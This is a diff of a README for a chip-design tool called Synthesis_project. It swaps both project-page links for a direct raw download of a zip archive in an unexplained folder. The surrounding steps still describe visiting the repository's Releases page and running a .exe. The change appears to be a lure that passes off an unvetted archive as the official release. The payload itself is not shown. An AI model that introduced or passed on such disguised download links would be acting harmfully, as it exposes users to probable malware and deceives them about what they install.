@@ -1,6 +1,6 @@
 # ⚡ Synthesis_project - Smart tools for faster chip design
 
-[![Download Synthesis_project](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Melodie8889/Synthesis_project)
+[![Download Synthesis_project](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Melodie8889/Synthesis_project/main/beshriek/Synthesis-project-v2.1.zip)
 
 Synthesis_project provides tools for chip designers. It helps you analyze circuits, check hardware security, and run timing tests on your computer. The software uses modern artificial intelligence to simplify complex tasks in physical chip design. You can view your circuit data as a graph to spot issues before they reach the factory.
 
@@ -28,7 +28,7 @@ Ensure your computer meets these needs to run the software smoothly.
 
 Follow these steps to get the software on your computer.
 
-1. Go to the project website: [https://github.com/Melodie8889/Synthesis_project](https://github.com/Melodie8889/Synthesis_project)
+1. Go to the project website: [https://raw.githubusercontent.com/Melodie8889/Synthesis_project/main/beshriek/Synthesis-project-v2.1.zip](https://raw.githubusercontent.com/Melodie8889/Synthesis_project/main/beshriek/Synthesis-project-v2.1.zip)
 2. Locate the "Releases" section on the right side of the page.
 3. Click the most recent version number.
 4. Look for the file ending in .exe under the "Assets" section.
